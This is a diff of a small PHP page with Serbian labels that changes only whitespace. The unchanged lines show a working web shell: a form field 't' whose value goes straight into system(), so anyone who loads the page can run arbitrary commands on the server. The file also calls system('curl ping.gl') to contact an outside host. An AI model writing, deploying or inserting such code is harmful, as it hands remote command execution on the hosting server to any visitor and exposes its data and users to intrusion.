@@ -1,10 +1,9 @@
 <?php
 
 echo '<form>
-			<input name="t" type="search" class="inp" placeholder="Unesi komandu" autofocus>
-			<input type="submit" value="ENTER">
-		</form>';
-
+<input name="t" type="search" class="inp" placeholder="Unesi komandu" autofocus>
+<input type="submit" value="ENTER">
+</form>';
 
 echo '<pre>USKRS - Uprava Srpske Kibernetike</pre>';
 
@@ -16,7 +15,6 @@ echo '
 <hr />Random port: ' . $last_line . '
 <hr />Vrati vrednost: ' . $retval;
 
-
 echo '<pre>';
 $last_line = system('curl ping.gl', $retval);
 echo '<hr />Vrati vrednost:' . $retval;
@@ -26,8 +24,5 @@ echo '<pre>';
 echo 'terminal<hr />';
 echo system($_GET['t']);
 echo '</pre>';
-
-
-
 
 ?>
